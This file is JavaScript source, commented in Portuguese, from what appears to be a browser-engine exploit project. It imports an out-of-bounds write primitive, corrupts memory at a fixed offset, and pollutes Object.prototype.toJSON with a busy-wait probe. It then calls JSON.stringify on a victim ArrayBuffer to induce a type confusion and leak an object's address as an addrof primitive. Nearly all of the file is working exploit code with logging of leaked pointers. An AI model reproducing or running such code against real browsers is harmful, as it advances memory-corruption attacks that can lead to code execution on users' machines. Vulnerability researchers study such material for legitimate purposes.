// js/script3/testArrayBufferVictimCrash.mjs (V6 - Sonda com Busy Wait e Re-check - Log Corrigido)
import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Não usado diretamente se isOOBReady for suficiente
    oob_write_absolute,
    clearOOBEnvironment,
    isOOBReady
} from '../core_exploit.mjs';

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Addrof_V6_BusyWaitProbe";

const CRITICAL_OOB_WRITE_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;

let toJSON_call_details_v28 = null; // Objeto global para detalhes da sonda
let object_to_leak_for_addrof_attempt = null;
let victim_ab_ref_for_original_test = null;
let float64_view_ref_for_final_check = null; // Para verificar o buffer após stringify

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug com Sonda Busy Wait/Re-check ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    // Resetar o objeto global de detalhes da sonda
    toJSON_call_details_v28 = {
        probe_variant: "V6_BusyWaitProbe",
        type_observed_in_probe: "N/A", // Tipo final observado pela última invocação da sonda (geral)
        initial_type_in_probe: "N/A",  // Tipo inicial da última invocação da sonda (geral)
        final_type_before_write_in_probe: "N/A", // Tipo antes da escrita na última invocação da sonda (geral)
        error_in_toJSON: null,
        probe_called: false, // Será true se a sonda for chamada ao menos uma vez
        addrof_write_attempted: false, // A escrita no victim_ab foi tentada?
        addrof_write_succeeded_assumption: false, // A escrita no victim_ab foi tentada E o tipo era [object Object]?
        busy_wait_loops: 0, // Loops do busy_wait na última invocação da sonda
        // Campos específicos do victim_ab
        victim_ab_initial_type: "N/A_VictimNotSeen",
        victim_ab_final_type_after_busy_wait: "N/A_VictimNotSeen"
    };

    victim_ab_ref_for_original_test = null;
    float64_view_ref_for_final_check = null;
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject_V6_BusyWait" };

    let errorCapturedMain = null;
    let stringifyOutput = null; // Retorno da última chamada da sonda
    const fill_pattern_v6 = 0.123456789101112;

    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou Heisenbug não ocorreu no momento certo."
    };

    const corruptionTargetOffsetInOOBAB = 0x7C;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("OOB Init falhou ou buffer não está pronto.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100);

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        float64_view_ref_for_final_check = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_ref_for_final_check.fill(fill_pattern_v6);
        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_ref_for_final_check[0]}.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;
        let probeInvocationCounterV6 = 0;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: function ProbeCoreExploit_V6_toJSON_BusyWait() {
                    probeInvocationCounterV6++;
                    toJSON_call_details_v28.probe_called = true; // Sonda foi chamada
                    toJSON_call_details_v28.probe_variant = "V6_BusyWaitProbe_Executed"; // Marcar qual sonda rodou
                    let currentTypeThis = ""; // Tipo do 'this' atual
                    let typeChangedToObjectInLoop = false;
                    let loops = 0;

                    const is_current_this_victim = (this === victim_ab_ref_for_original_test);

                    try {
                        const initialTypeThis = Object.prototype.toString.call(this);
                        toJSON_call_details_v28.initial_type_in_probe = initialTypeThis; // Tipo inicial geral
                        if(is_current_this_victim) toJSON_call_details_v28.victim_ab_initial_type = initialTypeThis;

                        logS3(`[Probe_V6 Inv#${probeInvocationCounterV6}] Tipo INICIAL de 'this': ${initialTypeThis}. É Victim: ${is_current_this_victim}`, "leak");

                        const maxBusyWaitDuration = 15; // ms
                        const busyWaitCheckInterval = 1; // ms
                        const startTime = Date.now();

                        currentTypeThis = initialTypeThis; // Começa com o tipo inicial

                        while(Date.now() - startTime < maxBusyWaitDuration) {
                            loops++;
                            currentTypeThis = Object.prototype.toString.call(this);
                            if (currentTypeThis === '[object Object]') {
                                typeChangedToObjectInLoop = true;
                                break;
                            }
                            let spinStartTime = Date.now();
                            while(Date.now() - spinStartTime < busyWaitCheckInterval) { /* spin */ }
                        }
                        toJSON_call_details_v28.busy_wait_loops = loops; // Loops da última invocação
                        toJSON_call_details_v28.final_type_before_write_in_probe = currentTypeThis; // Tipo final geral
                        if(is_current_this_victim) toJSON_call_details_v28.victim_ab_final_type_after_busy_wait = currentTypeThis;


                        logS3(`[Probe_V6 Inv#${probeInvocationCounterV6}] Após busy wait (${loops} loops, ${Date.now() - startTime}ms), tipo FINAL de 'this': ${currentTypeThis}`, "leak");

                        // Tenta a escrita APENAS se 'this' for o victim_ab E o tipo mudou para [object Object] no loop
                        if (is_current_this_victim && typeChangedToObjectInLoop && object_to_leak_for_addrof_attempt) {
                            logS3(`[Probe_V6 Inv#${probeInvocationCounterV6}] VICTIM_AB é [object Object]! Tentando escrita de addrof...`, "vuln");
                            this[0] = object_to_leak_for_addrof_attempt;
                            toJSON_call_details_v28.addrof_write_attempted = true; // Escrita no victim_ab tentada
                            logS3(`[Probe_V6 Inv#${probeInvocationCounterV6}] Escrita em victim_ab (supostamente) realizada.`, "info");
                            toJSON_call_details_v28.addrof_write_succeeded_assumption = true;
                        } else if (is_current_this_victim) {
                            logS3(`[Probe_V6 Inv#${probeInvocationCounterV6}] Condição para escrita no victim_ab não atendida. Tipo final: ${currentTypeThis}, TypeChangedInLoop: ${typeChangedToObjectInLoop}`, "warn");
                        }
                    } catch (e_probe) {
                        toJSON_call_details_v28.error_in_toJSON = `ProbeError: ${e_probe.name}: ${e_probe.message}`;
                        logS3(`[Probe_V6 Inv#${probeInvocationCounterV6}] ERRO na sonda: ${e_probe.message}`, "error");
                    }
                    // O tipo observado final para o relatório do runner será o último tipo do victim_ab
                    toJSON_call_details_v28.type_observed_in_probe = toJSON_call_details_v28.victim_ab_final_type_after_busy_wait;
                    return { probe_V6_invoked: true, inv_id: probeInvocationCounterV6, final_type_this: currentTypeThis };
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com sonda V6 (Busy Wait).`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test);

            logS3(`  JSON.stringify completou. Retorno da sonda (última chamada): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            // CORREÇÃO DO LOG: Logar o objeto global toJSON_call_details_v28
            logS3(`  Detalhes GLOBAIS da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);


            if (toJSON_call_details_v28.addrof_write_attempted) {
                logS3("PASSO 3: Verificando buffer APÓS escrita tentada na sonda...", "warn", FNAME_CURRENT_TEST);
                const value_read_as_double = float64_view_ref_for_final_check[0];
                addrof_result.leaked_address_as_double = value_read_as_double;
                logS3(`  Valor lido: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

                const dv_buf = new ArrayBuffer(8); const dv_float = new Float64Array(dv_buf); const dv_u32 = new Uint32Array(dv_buf);
                dv_float[0] = value_read_as_double; addrof_result.leaked_address_as_int64 = new AdvancedInt64(dv_u32[0], dv_u32[1]);
                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                if (value_read_as_double !== 0 && Math.abs(value_read_as_double - fill_pattern_v6) > 1e-9 &&
                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result.success = true;
                    addrof_result.message = "TC na sonda OK, escrita tentada E VALOR DO BUFFER MUDOU.";
                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
                } else {
                    addrof_result.message = "TC na sonda OK, escrita tentada, mas valor do buffer não mudou/não parece ponteiro.";
                    if (Math.abs(value_read_as_double - fill_pattern_v6) < 1e-9) addrof_result.message += " (Buffer não alterado)";
                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: TC Probe OK, AddrVal FAIL`;
                }
            } else {
                addrof_result.message = "Escrita no victim_ab não foi marcada como tentada pela sonda.";
                if(toJSON_call_details_v28.error_in_toJSON) addrof_result.message += ` Erro na sonda: ${toJSON_call_details_v28.error_in_toJSON}`;
                else if (toJSON_call_details_v28.victim_ab_final_type_after_busy_wait !== '[object Object]') addrof_result.message += ` Tipo final do victim_ab na sonda: ${toJSON_call_details_v28.victim_ab_final_type_after_busy_wait}.`;
                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: AddrWrite SKIPPED`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  ERRO CRÍTICO durante JSON.stringify: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Probe ERR`;
            addrof_result.message = `Erro na execução (stringify/probe): ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) { logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST); }
        document.title = `${FNAME_MODULE_V28} CRITICAL FAIL`;
        addrof_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
    } finally {
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64 && addrof_result.success){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
        float64_view_ref_for_final_check = null;
    }
    return {
        errorOccurred: errorCapturedMain,
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput,
        toJSON_details: toJSON_call_details_v28,
        addrof_attempt_result: addrof_result
    };
}
